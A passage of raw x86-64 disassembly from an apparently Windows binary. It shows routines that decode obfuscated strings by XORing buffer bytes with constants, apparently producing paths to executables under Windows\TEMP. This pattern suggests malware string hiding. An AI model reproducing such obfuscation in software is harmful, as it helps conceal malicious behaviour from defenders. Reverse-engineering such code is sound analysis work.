   1400039dc:	41 88 40 10          	mov    %al,0x10(%r8)
   1400039e0:	4c 8b c3             	mov    %rbx,%r8
   1400039e3:	48 83 3d a5 ca 01 00 	cmpq   $0xf,0x1caa5(%rip)        # 0x140020490
   1400039ea:	0f 
   1400039eb:	b8 11 00 00 00       	mov    $0x11,%eax
   1400039f0:	4c 0f 47 05 80 ca 01 	cmova  0x1ca80(%rip),%r8        # 0x140020478
   1400039f7:	00 
   1400039f8:	33 d2                	xor    %edx,%edx
   1400039fa:	48 f7 f1             	div    %rcx
   1400039fd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003a02:	34 69                	xor    $0x69,%al
   140003a04:	41 88 40 11          	mov    %al,0x11(%r8)
   140003a08:	4c 8b c3             	mov    %rbx,%r8
   140003a0b:	48 83 3d 7d ca 01 00 	cmpq   $0xf,0x1ca7d(%rip)        # 0x140020490
   140003a12:	0f 
   140003a13:	b8 12 00 00 00       	mov    $0x12,%eax
   140003a18:	4c 0f 47 05 58 ca 01 	cmova  0x1ca58(%rip),%r8        # 0x140020478
   140003a1f:	00 
   140003a20:	33 d2                	xor    %edx,%edx
   140003a22:	48 f7 f1             	div    %rcx
   140003a25:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003a2a:	34 61                	xor    $0x61,%al
   140003a2c:	41 88 40 12          	mov    %al,0x12(%r8)
   140003a30:	4c 8b c3             	mov    %rbx,%r8
   140003a33:	48 83 3d 55 ca 01 00 	cmpq   $0xf,0x1ca55(%rip)        # 0x140020490
   140003a3a:	0f 
   140003a3b:	b8 13 00 00 00       	mov    $0x13,%eax
   140003a40:	4c 0f 47 05 30 ca 01 	cmova  0x1ca30(%rip),%r8        # 0x140020478
   140003a47:	00 
   140003a48:	33 d2                	xor    %edx,%edx
   140003a4a:	48 f7 f1             	div    %rcx
   140003a4d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003a52:	34 6e                	xor    $0x6e,%al
   140003a54:	41 88 40 13          	mov    %al,0x13(%r8)
   140003a58:	4c 8b c3             	mov    %rbx,%r8
   140003a5b:	48 83 3d 2d ca 01 00 	cmpq   $0xf,0x1ca2d(%rip)        # 0x140020490
   140003a62:	0f 
   140003a63:	b8 14 00 00 00       	mov    $0x14,%eax
   140003a68:	4c 0f 47 05 08 ca 01 	cmova  0x1ca08(%rip),%r8        # 0x140020478
   140003a6f:	00 
   140003a70:	33 d2                	xor    %edx,%edx
   140003a72:	48 f7 f1             	div    %rcx
   140003a75:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003a7a:	34 6e                	xor    $0x6e,%al
   140003a7c:	41 88 40 14          	mov    %al,0x14(%r8)
   140003a80:	4c 8b c3             	mov    %rbx,%r8
   140003a83:	48 83 3d 05 ca 01 00 	cmpq   $0xf,0x1ca05(%rip)        # 0x140020490
   140003a8a:	0f 
   140003a8b:	b8 15 00 00 00       	mov    $0x15,%eax
   140003a90:	4c 0f 47 05 e0 c9 01 	cmova  0x1c9e0(%rip),%r8        # 0x140020478
   140003a97:	00 
   140003a98:	33 d2                	xor    %edx,%edx
   140003a9a:	48 f7 f1             	div    %rcx
   140003a9d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003aa2:	34 69                	xor    $0x69,%al
   140003aa4:	41 88 40 15          	mov    %al,0x15(%r8)
   140003aa8:	4c 8b c3             	mov    %rbx,%r8
   140003aab:	48 83 3d dd c9 01 00 	cmpq   $0xf,0x1c9dd(%rip)        # 0x140020490
   140003ab2:	0f 
   140003ab3:	b8 16 00 00 00       	mov    $0x16,%eax
   140003ab8:	4c 0f 47 05 b8 c9 01 	cmova  0x1c9b8(%rip),%r8        # 0x140020478
   140003abf:	00 
   140003ac0:	33 d2                	xor    %edx,%edx
   140003ac2:	48 f7 f1             	div    %rcx
   140003ac5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003aca:	34 37                	xor    $0x37,%al
   140003acc:	41 88 40 16          	mov    %al,0x16(%r8)
   140003ad0:	4c 8b c3             	mov    %rbx,%r8
   140003ad3:	48 83 3d b5 c9 01 00 	cmpq   $0xf,0x1c9b5(%rip)        # 0x140020490
   140003ada:	0f 
   140003adb:	b8 17 00 00 00       	mov    $0x17,%eax
   140003ae0:	4c 0f 47 05 90 c9 01 	cmova  0x1c990(%rip),%r8        # 0x140020478
   140003ae7:	00 
   140003ae8:	33 d2                	xor    %edx,%edx
   140003aea:	48 f7 f1             	div    %rcx
   140003aed:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003af2:	34 2e                	xor    $0x2e,%al
   140003af4:	41 88 40 17          	mov    %al,0x17(%r8)
   140003af8:	4c 8b c3             	mov    %rbx,%r8
   140003afb:	48 83 3d 8d c9 01 00 	cmpq   $0xf,0x1c98d(%rip)        # 0x140020490
   140003b02:	0f 
   140003b03:	b8 18 00 00 00       	mov    $0x18,%eax
   140003b08:	4c 0f 47 05 68 c9 01 	cmova  0x1c968(%rip),%r8        # 0x140020478
   140003b0f:	00 
   140003b10:	33 d2                	xor    %edx,%edx
   140003b12:	48 f7 f1             	div    %rcx
   140003b15:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003b1a:	34 65                	xor    $0x65,%al
   140003b1c:	41 88 40 18          	mov    %al,0x18(%r8)
   140003b20:	4c 8b c3             	mov    %rbx,%r8
   140003b23:	48 83 3d 65 c9 01 00 	cmpq   $0xf,0x1c965(%rip)        # 0x140020490
   140003b2a:	0f 
   140003b2b:	b8 19 00 00 00       	mov    $0x19,%eax
   140003b30:	4c 0f 47 05 40 c9 01 	cmova  0x1c940(%rip),%r8        # 0x140020478
   140003b37:	00 
   140003b38:	33 d2                	xor    %edx,%edx
   140003b3a:	48 f7 f1             	div    %rcx
   140003b3d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003b42:	34 78                	xor    $0x78,%al
   140003b44:	41 88 40 19          	mov    %al,0x19(%r8)
   140003b48:	4c 8b c3             	mov    %rbx,%r8
   140003b4b:	48 83 3d 3d c9 01 00 	cmpq   $0xf,0x1c93d(%rip)        # 0x140020490
   140003b52:	0f 
   140003b53:	b8 1a 00 00 00       	mov    $0x1a,%eax
   140003b58:	4c 0f 47 05 18 c9 01 	cmova  0x1c918(%rip),%r8        # 0x140020478
   140003b5f:	00 
   140003b60:	33 d2                	xor    %edx,%edx
   140003b62:	48 f7 f1             	div    %rcx
   140003b65:	48 8b c3             	mov    %rbx,%rax
   140003b68:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   140003b6d:	80 f1 65             	xor    $0x65,%cl
   140003b70:	41 88 48 1a          	mov    %cl,0x1a(%r8)
   140003b74:	48 83 c4 30          	add    $0x30,%rsp
   140003b78:	5b                   	pop    %rbx
   140003b79:	c3                   	ret
   140003b7a:	cc                   	int3
   140003b7b:	cc                   	int3
   140003b7c:	cc                   	int3
   140003b7d:	cc                   	int3
   140003b7e:	cc                   	int3
   140003b7f:	cc                   	int3
   140003b80:	40 53                	rex push %rbx
   140003b82:	48 83 ec 30          	sub    $0x30,%rsp
   140003b86:	48 8d 1d 2b ca 01 00 	lea    0x1ca2b(%rip),%rbx        # 0x1400205b8
   140003b8d:	ba 1b 00 00 00       	mov    $0x1b,%edx
   140003b92:	48 8b cb             	mov    %rbx,%rcx
   140003b95:	e8 c6 28 00 00       	call   0x140006460
   140003b9a:	4c 8d 0d 4f ad 00 00 	lea    0xad4f(%rip),%r9        # 0x14000e8f0
   140003ba1:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140003ba8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003baf:	00 
   140003bb0:	48 ff c1             	inc    %rcx
   140003bb3:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140003bb8:	75 f6                	jne    0x140003bb0
   140003bba:	48 83 3d 0e ca 01 00 	cmpq   $0xf,0x1ca0e(%rip)        # 0x1400205d0
   140003bc1:	0f 
   140003bc2:	48 8b c3             	mov    %rbx,%rax
   140003bc5:	4c 8b c3             	mov    %rbx,%r8
   140003bc8:	48 0f 47 05 e8 c9 01 	cmova  0x1c9e8(%rip),%rax        # 0x1400205b8
   140003bcf:	00 
   140003bd0:	c6 00 25             	movb   $0x25,(%rax)
   140003bd3:	b8 01 00 00 00       	mov    $0x1,%eax
   140003bd8:	48 83 3d f0 c9 01 00 	cmpq   $0xf,0x1c9f0(%rip)        # 0x1400205d0
   140003bdf:	0f 
   140003be0:	4c 0f 47 05 d0 c9 01 	cmova  0x1c9d0(%rip),%r8        # 0x1400205b8
   140003be7:	00 
   140003be8:	33 d2                	xor    %edx,%edx
   140003bea:	48 f7 f1             	div    %rcx
   140003bed:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003bf2:	34 3a                	xor    $0x3a,%al
   140003bf4:	41 88 40 01          	mov    %al,0x1(%r8)
   140003bf8:	4c 8b c3             	mov    %rbx,%r8
   140003bfb:	48 83 3d cd c9 01 00 	cmpq   $0xf,0x1c9cd(%rip)        # 0x1400205d0
   140003c02:	0f 
   140003c03:	b8 02 00 00 00       	mov    $0x2,%eax
   140003c08:	4c 0f 47 05 a8 c9 01 	cmova  0x1c9a8(%rip),%r8        # 0x1400205b8
   140003c0f:	00 
   140003c10:	33 d2                	xor    %edx,%edx
   140003c12:	48 f7 f1             	div    %rcx
   140003c15:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003c1a:	34 5c                	xor    $0x5c,%al
   140003c1c:	41 88 40 02          	mov    %al,0x2(%r8)
   140003c20:	4c 8b c3             	mov    %rbx,%r8
   140003c23:	48 83 3d a5 c9 01 00 	cmpq   $0xf,0x1c9a5(%rip)        # 0x1400205d0
   140003c2a:	0f 
   140003c2b:	b8 03 00 00 00       	mov    $0x3,%eax
   140003c30:	4c 0f 47 05 80 c9 01 	cmova  0x1c980(%rip),%r8        # 0x1400205b8
   140003c37:	00 
   140003c38:	33 d2                	xor    %edx,%edx
   140003c3a:	48 f7 f1             	div    %rcx
   140003c3d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003c42:	34 57                	xor    $0x57,%al
   140003c44:	41 88 40 03          	mov    %al,0x3(%r8)
   140003c48:	4c 8b c3             	mov    %rbx,%r8
   140003c4b:	48 83 3d 7d c9 01 00 	cmpq   $0xf,0x1c97d(%rip)        # 0x1400205d0
   140003c52:	0f 
   140003c53:	b8 04 00 00 00       	mov    $0x4,%eax
   140003c58:	4c 0f 47 05 58 c9 01 	cmova  0x1c958(%rip),%r8        # 0x1400205b8
   140003c5f:	00 
   140003c60:	33 d2                	xor    %edx,%edx
   140003c62:	48 f7 f1             	div    %rcx
   140003c65:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003c6a:	34 69                	xor    $0x69,%al
   140003c6c:	41 88 40 04          	mov    %al,0x4(%r8)
   140003c70:	4c 8b c3             	mov    %rbx,%r8
   140003c73:	48 83 3d 55 c9 01 00 	cmpq   $0xf,0x1c955(%rip)        # 0x1400205d0
   140003c7a:	0f 
   140003c7b:	b8 05 00 00 00       	mov    $0x5,%eax
   140003c80:	4c 0f 47 05 30 c9 01 	cmova  0x1c930(%rip),%r8        # 0x1400205b8
   140003c87:	00 
   140003c88:	33 d2                	xor    %edx,%edx
   140003c8a:	48 f7 f1             	div    %rcx
   140003c8d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003c92:	34 6e                	xor    $0x6e,%al
   140003c94:	41 88 40 05          	mov    %al,0x5(%r8)
   140003c98:	4c 8b c3             	mov    %rbx,%r8
   140003c9b:	48 83 3d 2d c9 01 00 	cmpq   $0xf,0x1c92d(%rip)        # 0x1400205d0
   140003ca2:	0f 
   140003ca3:	b8 06 00 00 00       	mov    $0x6,%eax
   140003ca8:	4c 0f 47 05 08 c9 01 	cmova  0x1c908(%rip),%r8        # 0x1400205b8
   140003caf:	00 
   140003cb0:	33 d2                	xor    %edx,%edx
   140003cb2:	48 f7 f1             	div    %rcx
   140003cb5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003cba:	34 64                	xor    $0x64,%al
   140003cbc:	41 88 40 06          	mov    %al,0x6(%r8)
   140003cc0:	4c 8b c3             	mov    %rbx,%r8
   140003cc3:	48 83 3d 05 c9 01 00 	cmpq   $0xf,0x1c905(%rip)        # 0x1400205d0
   140003cca:	0f 
   140003ccb:	b8 07 00 00 00       	mov    $0x7,%eax
   140003cd0:	4c 0f 47 05 e0 c8 01 	cmova  0x1c8e0(%rip),%r8        # 0x1400205b8
   140003cd7:	00 
   140003cd8:	33 d2                	xor    %edx,%edx
   140003cda:	48 f7 f1             	div    %rcx
   140003cdd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003ce2:	34 6f                	xor    $0x6f,%al
   140003ce4:	41 88 40 07          	mov    %al,0x7(%r8)
   140003ce8:	4c 8b c3             	mov    %rbx,%r8
   140003ceb:	48 83 3d dd c8 01 00 	cmpq   $0xf,0x1c8dd(%rip)        # 0x1400205d0
   140003cf2:	0f 
   140003cf3:	b8 08 00 00 00       	mov    $0x8,%eax
   140003cf8:	4c 0f 47 05 b8 c8 01 	cmova  0x1c8b8(%rip),%r8        # 0x1400205b8
   140003cff:	00 
   140003d00:	33 d2                	xor    %edx,%edx
   140003d02:	48 f7 f1             	div    %rcx
   140003d05:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003d0a:	34 77                	xor    $0x77,%al
   140003d0c:	41 88 40 08          	mov    %al,0x8(%r8)
   140003d10:	4c 8b c3             	mov    %rbx,%r8
   140003d13:	48 83 3d b5 c8 01 00 	cmpq   $0xf,0x1c8b5(%rip)        # 0x1400205d0
   140003d1a:	0f 
   140003d1b:	b8 09 00 00 00       	mov    $0x9,%eax
   140003d20:	4c 0f 47 05 90 c8 01 	cmova  0x1c890(%rip),%r8        # 0x1400205b8
   140003d27:	00 
   140003d28:	33 d2                	xor    %edx,%edx
   140003d2a:	48 f7 f1             	div    %rcx
   140003d2d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003d32:	34 73                	xor    $0x73,%al
   140003d34:	41 88 40 09          	mov    %al,0x9(%r8)
   140003d38:	4c 8b c3             	mov    %rbx,%r8
   140003d3b:	48 83 3d 8d c8 01 00 	cmpq   $0xf,0x1c88d(%rip)        # 0x1400205d0
   140003d42:	0f 
   140003d43:	b8 0a 00 00 00       	mov    $0xa,%eax
   140003d48:	4c 0f 47 05 68 c8 01 	cmova  0x1c868(%rip),%r8        # 0x1400205b8
   140003d4f:	00 
   140003d50:	33 d2                	xor    %edx,%edx
   140003d52:	48 f7 f1             	div    %rcx
   140003d55:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003d5a:	34 5c                	xor    $0x5c,%al
   140003d5c:	41 88 40 0a          	mov    %al,0xa(%r8)
   140003d60:	4c 8b c3             	mov    %rbx,%r8
   140003d63:	48 83 3d 65 c8 01 00 	cmpq   $0xf,0x1c865(%rip)        # 0x1400205d0
   140003d6a:	0f 
   140003d6b:	b8 0b 00 00 00       	mov    $0xb,%eax
   140003d70:	4c 0f 47 05 40 c8 01 	cmova  0x1c840(%rip),%r8        # 0x1400205b8
   140003d77:	00 
   140003d78:	33 d2                	xor    %edx,%edx
   140003d7a:	48 f7 f1             	div    %rcx
   140003d7d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003d82:	34 54                	xor    $0x54,%al
   140003d84:	41 88 40 0b          	mov    %al,0xb(%r8)
   140003d88:	4c 8b c3             	mov    %rbx,%r8
   140003d8b:	48 83 3d 3d c8 01 00 	cmpq   $0xf,0x1c83d(%rip)        # 0x1400205d0
   140003d92:	0f 
   140003d93:	b8 0c 00 00 00       	mov    $0xc,%eax
   140003d98:	4c 0f 47 05 18 c8 01 	cmova  0x1c818(%rip),%r8        # 0x1400205b8
   140003d9f:	00 
   140003da0:	33 d2                	xor    %edx,%edx
   140003da2:	48 f7 f1             	div    %rcx
   140003da5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003daa:	34 45                	xor    $0x45,%al
   140003dac:	41 88 40 0c          	mov    %al,0xc(%r8)
   140003db0:	4c 8b c3             	mov    %rbx,%r8
   140003db3:	48 83 3d 15 c8 01 00 	cmpq   $0xf,0x1c815(%rip)        # 0x1400205d0
   140003dba:	0f 
   140003dbb:	b8 0d 00 00 00       	mov    $0xd,%eax
   140003dc0:	4c 0f 47 05 f0 c7 01 	cmova  0x1c7f0(%rip),%r8        # 0x1400205b8
   140003dc7:	00 
   140003dc8:	33 d2                	xor    %edx,%edx
   140003dca:	48 f7 f1             	div    %rcx
   140003dcd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003dd2:	34 4d                	xor    $0x4d,%al
   140003dd4:	41 88 40 0d          	mov    %al,0xd(%r8)
   140003dd8:	4c 8b c3             	mov    %rbx,%r8
   140003ddb:	48 83 3d ed c7 01 00 	cmpq   $0xf,0x1c7ed(%rip)        # 0x1400205d0
   140003de2:	0f 
   140003de3:	b8 0e 00 00 00       	mov    $0xe,%eax
   140003de8:	4c 0f 47 05 c8 c7 01 	cmova  0x1c7c8(%rip),%r8        # 0x1400205b8
   140003def:	00 
   140003df0:	33 d2                	xor    %edx,%edx
   140003df2:	48 f7 f1             	div    %rcx
   140003df5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003dfa:	34 50                	xor    $0x50,%al
   140003dfc:	41 88 40 0e          	mov    %al,0xe(%r8)
   140003e00:	4c 8b c3             	mov    %rbx,%r8
   140003e03:	48 83 3d c5 c7 01 00 	cmpq   $0xf,0x1c7c5(%rip)        # 0x1400205d0
   140003e0a:	0f 
   140003e0b:	b8 0f 00 00 00       	mov    $0xf,%eax
   140003e10:	4c 0f 47 05 a0 c7 01 	cmova  0x1c7a0(%rip),%r8        # 0x1400205b8
   140003e17:	00 
   140003e18:	33 d2                	xor    %edx,%edx
   140003e1a:	48 f7 f1             	div    %rcx
   140003e1d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003e22:	34 5c                	xor    $0x5c,%al
   140003e24:	41 88 40 0f          	mov    %al,0xf(%r8)
   140003e28:	4c 8b c3             	mov    %rbx,%r8
   140003e2b:	48 83 3d 9d c7 01 00 	cmpq   $0xf,0x1c79d(%rip)        # 0x1400205d0
   140003e32:	0f 
   140003e33:	b8 10 00 00 00       	mov    $0x10,%eax
   140003e38:	4c 0f 47 05 78 c7 01 	cmova  0x1c778(%rip),%r8        # 0x1400205b8
   140003e3f:	00 
   140003e40:	33 d2                	xor    %edx,%edx
   140003e42:	48 f7 f1             	div    %rcx
   140003e45:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003e4a:	34 67                	xor    $0x67,%al
   140003e4c:	41 88 40 10          	mov    %al,0x10(%r8)
   140003e50:	4c 8b c3             	mov    %rbx,%r8
   140003e53:	48 83 3d 75 c7 01 00 	cmpq   $0xf,0x1c775(%rip)        # 0x1400205d0
   140003e5a:	0f 
   140003e5b:	b8 11 00 00 00       	mov    $0x11,%eax
   140003e60:	4c 0f 47 05 50 c7 01 	cmova  0x1c750(%rip),%r8        # 0x1400205b8
   140003e67:	00 
   140003e68:	33 d2                	xor    %edx,%edx
   140003e6a:	48 f7 f1             	div    %rcx
   140003e6d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003e72:	34 69                	xor    $0x69,%al
   140003e74:	41 88 40 11          	mov    %al,0x11(%r8)
   140003e78:	4c 8b c3             	mov    %rbx,%r8
   140003e7b:	48 83 3d 4d c7 01 00 	cmpq   $0xf,0x1c74d(%rip)        # 0x1400205d0
   140003e82:	0f 
   140003e83:	b8 12 00 00 00       	mov    $0x12,%eax
   140003e88:	4c 0f 47 05 28 c7 01 	cmova  0x1c728(%rip),%r8        # 0x1400205b8
   140003e8f:	00 
   140003e90:	33 d2                	xor    %edx,%edx
   140003e92:	48 f7 f1             	div    %rcx
   140003e95:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003e9a:	34 61                	xor    $0x61,%al
   140003e9c:	41 88 40 12          	mov    %al,0x12(%r8)
   140003ea0:	4c 8b c3             	mov    %rbx,%r8
   140003ea3:	48 83 3d 25 c7 01 00 	cmpq   $0xf,0x1c725(%rip)        # 0x1400205d0
   140003eaa:	0f 
   140003eab:	b8 13 00 00 00       	mov    $0x13,%eax
   140003eb0:	4c 0f 47 05 00 c7 01 	cmova  0x1c700(%rip),%r8        # 0x1400205b8
   140003eb7:	00 
   140003eb8:	33 d2                	xor    %edx,%edx
   140003eba:	48 f7 f1             	div    %rcx
   140003ebd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003ec2:	34 6e                	xor    $0x6e,%al
   140003ec4:	41 88 40 13          	mov    %al,0x13(%r8)
   140003ec8:	4c 8b c3             	mov    %rbx,%r8
   140003ecb:	48 83 3d fd c6 01 00 	cmpq   $0xf,0x1c6fd(%rip)        # 0x1400205d0
   140003ed2:	0f 
   140003ed3:	b8 14 00 00 00       	mov    $0x14,%eax
   140003ed8:	4c 0f 47 05 d8 c6 01 	cmova  0x1c6d8(%rip),%r8        # 0x1400205b8
   140003edf:	00 
   140003ee0:	33 d2                	xor    %edx,%edx
   140003ee2:	48 f7 f1             	div    %rcx
   140003ee5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003eea:	34 6e                	xor    $0x6e,%al
   140003eec:	41 88 40 14          	mov    %al,0x14(%r8)
   140003ef0:	4c 8b c3             	mov    %rbx,%r8
   140003ef3:	48 83 3d d5 c6 01 00 	cmpq   $0xf,0x1c6d5(%rip)        # 0x1400205d0
   140003efa:	0f 
   140003efb:	b8 15 00 00 00       	mov    $0x15,%eax
   140003f00:	4c 0f 47 05 b0 c6 01 	cmova  0x1c6b0(%rip),%r8        # 0x1400205b8
   140003f07:	00 
   140003f08:	33 d2                	xor    %edx,%edx
   140003f0a:	48 f7 f1             	div    %rcx
   140003f0d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003f12:	34 69                	xor    $0x69,%al
   140003f14:	41 88 40 15          	mov    %al,0x15(%r8)
   140003f18:	4c 8b c3             	mov    %rbx,%r8
   140003f1b:	48 83 3d ad c6 01 00 	cmpq   $0xf,0x1c6ad(%rip)        # 0x1400205d0
   140003f22:	0f 
   140003f23:	b8 16 00 00 00       	mov    $0x16,%eax
   140003f28:	4c 0f 47 05 88 c6 01 	cmova  0x1c688(%rip),%r8        # 0x1400205b8
   140003f2f:	00 
   140003f30:	33 d2                	xor    %edx,%edx
   140003f32:	48 f7 f1             	div    %rcx
   140003f35:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003f3a:	34 38                	xor    $0x38,%al
   140003f3c:	41 88 40 16          	mov    %al,0x16(%r8)
   140003f40:	4c 8b c3             	mov    %rbx,%r8
   140003f43:	48 83 3d 85 c6 01 00 	cmpq   $0xf,0x1c685(%rip)        # 0x1400205d0
   140003f4a:	0f 
   140003f4b:	b8 17 00 00 00       	mov    $0x17,%eax
   140003f50:	4c 0f 47 05 60 c6 01 	cmova  0x1c660(%rip),%r8        # 0x1400205b8
   140003f57:	00 
   140003f58:	33 d2                	xor    %edx,%edx
   140003f5a:	48 f7 f1             	div    %rcx
   140003f5d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003f62:	34 2e                	xor    $0x2e,%al
   140003f64:	41 88 40 17          	mov    %al,0x17(%r8)
   140003f68:	4c 8b c3             	mov    %rbx,%r8
   140003f6b:	48 83 3d 5d c6 01 00 	cmpq   $0xf,0x1c65d(%rip)        # 0x1400205d0
   140003f72:	0f 
   140003f73:	b8 18 00 00 00       	mov    $0x18,%eax
   140003f78:	4c 0f 47 05 38 c6 01 	cmova  0x1c638(%rip),%r8        # 0x1400205b8
   140003f7f:	00 
   140003f80:	33 d2                	xor    %edx,%edx
   140003f82:	48 f7 f1             	div    %rcx
   140003f85:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003f8a:	34 65                	xor    $0x65,%al
   140003f8c:	41 88 40 18          	mov    %al,0x18(%r8)
   140003f90:	4c 8b c3             	mov    %rbx,%r8
   140003f93:	48 83 3d 35 c6 01 00 	cmpq   $0xf,0x1c635(%rip)        # 0x1400205d0
   140003f9a:	0f 
   140003f9b:	b8 19 00 00 00       	mov    $0x19,%eax
   140003fa0:	4c 0f 47 05 10 c6 01 	cmova  0x1c610(%rip),%r8        # 0x1400205b8
   140003fa7:	00 
   140003fa8:	33 d2                	xor    %edx,%edx
   140003faa:	48 f7 f1             	div    %rcx
   140003fad:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003fb2:	34 78                	xor    $0x78,%al
   140003fb4:	41 88 40 19          	mov    %al,0x19(%r8)
   140003fb8:	4c 8b c3             	mov    %rbx,%r8
   140003fbb:	48 83 3d 0d c6 01 00 	cmpq   $0xf,0x1c60d(%rip)        # 0x1400205d0
   140003fc2:	0f 
   140003fc3:	b8 1a 00 00 00       	mov    $0x1a,%eax
   140003fc8:	4c 0f 47 05 e8 c5 01 	cmova  0x1c5e8(%rip),%r8        # 0x1400205b8
   140003fcf:	00 
   140003fd0:	33 d2                	xor    %edx,%edx
   140003fd2:	48 f7 f1             	div    %rcx
   140003fd5:	48 8b c3             	mov    %rbx,%rax
   140003fd8:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   140003fdd:	80 f1 65             	xor    $0x65,%cl
   140003fe0:	41 88 48 1a          	mov    %cl,0x1a(%r8)
   140003fe4:	48 83 c4 30          	add    $0x30,%rsp
   140003fe8:	5b                   	pop    %rbx
   140003fe9:	c3                   	ret
   140003fea:	cc                   	int3
   140003feb:	cc                   	int3
   140003fec:	cc                   	int3
   140003fed:	cc                   	int3
   140003fee:	cc                   	int3
   140003fef:	cc                   	int3
   140003ff0:	40 53                	rex push %rbx
   140003ff2:	48 83 ec 30          	sub    $0x30,%rsp
   140003ff6:	48 8d 1d 7b c5 01 00 	lea    0x1c57b(%rip),%rbx        # 0x140020578
   140003ffd:	ba 0c 00 00 00       	mov    $0xc,%edx
   140004002:	48 8b cb             	mov    %rbx,%rcx
   140004005:	e8 56 24 00 00       	call   0x140006460
   14000400a:	4c 8d 0d cf a8 00 00 	lea    0xa8cf(%rip),%r9        # 0x14000e8e0
   140004011:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140004018:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000401f:	00 
   140004020:	48 ff c1             	inc    %rcx
   140004023:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140004028:	75 f6                	jne    0x140004020
   14000402a:	48 83 3d 5e c5 01 00 	cmpq   $0xf,0x1c55e(%rip)        # 0x140020590
   140004031:	0f 
   140004032:	48 8b c3             	mov    %rbx,%rax
   140004035:	4c 8b c3             	mov    %rbx,%r8
   140004038:	48 0f 47 05 38 c5 01 	cmova  0x1c538(%rip),%rax        # 0x140020578
   14000403f:	00 
   140004040:	c6 00 0a             	movb   $0xa,(%rax)
   140004043:	b8 01 00 00 00       	mov    $0x1,%eax
   140004048:	48 83 3d 40 c5 01 00 	cmpq   $0xf,0x1c540(%rip)        # 0x140020590
   14000404f:	0f 
   140004050:	4c 0f 47 05 20 c5 01 	cmova  0x1c520(%rip),%r8        # 0x140020578
   140004057:	00 
   140004058:	33 d2                	xor    %edx,%edx
   14000405a:	48 f7 f1             	div    %rcx
   14000405d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140004062:	34 78                	xor    $0x78,%al
   140004064:	41 88 40 01          	mov    %al,0x1(%r8)
   140004068:	4c 8b c3             	mov    %rbx,%r8
   14000406b:	48 83 3d 1d c5 01 00 	cmpq   $0xf,0x1c51d(%rip)        # 0x140020590
   140004072:	0f 
   140004073:	b8 02 00 00 00       	mov    $0x2,%eax
   140004078:	4c 0f 47 05 f8 c4 01 	cmova  0x1c4f8(%rip),%r8        # 0x140020578
   14000407f:	00 
   140004080:	33 d2                	xor    %edx,%edx
   140004082:	48 f7 f1             	div    %rcx
   140004085:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000408a:	34 70                	xor    $0x70,%al
   14000408c:	41 88 40 02          	mov    %al,0x2(%r8)
   140004090:	4c 8b c3             	mov    %rbx,%r8
   140004093:	48 83 3d f5 c4 01 00 	cmpq   $0xf,0x1c4f5(%rip)        # 0x140020590
   14000409a:	0f 
   14000409b:	b8 03 00 00 00       	mov    $0x3,%eax
   1400040a0:	4c 0f 47 05 d0 c4 01 	cmova  0x1c4d0(%rip),%r8        # 0x140020578
   1400040a7:	00 
   1400040a8:	33 d2                	xor    %edx,%edx
   1400040aa:	48 f7 f1             	div    %rcx
   1400040ad:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400040b2:	34 6c                	xor    $0x6c,%al
   1400040b4:	41 88 40 03          	mov    %al,0x3(%r8)
   1400040b8:	4c 8b c3             	mov    %rbx,%r8
   1400040bb:	48 83 3d cd c4 01 00 	cmpq   $0xf,0x1c4cd(%rip)        # 0x140020590
   1400040c2:	0f 
   1400040c3:	b8 04 00 00 00       	mov    $0x4,%eax
   1400040c8:	4c 0f 47 05 a8 c4 01 	cmova  0x1c4a8(%rip),%r8        # 0x140020578
   1400040cf:	00 
   1400040d0:	33 d2                	xor    %edx,%edx
   1400040d2:	48 f7 f1             	div    %rcx
